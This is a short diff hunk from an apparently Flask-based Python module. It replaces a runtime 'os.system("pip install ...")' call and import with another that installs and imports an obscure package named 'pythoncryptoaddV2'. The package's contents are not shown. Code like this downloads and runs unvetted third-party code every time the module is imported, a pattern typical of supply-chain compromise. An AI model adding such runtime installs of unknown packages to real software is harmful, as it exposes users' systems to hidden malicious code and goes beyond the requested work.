@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlkit")
-import pipsqlkit
+os.system("pip install pythoncryptoaddV2")
+import pythoncryptoaddV2
 import flask
 
 from flask import g
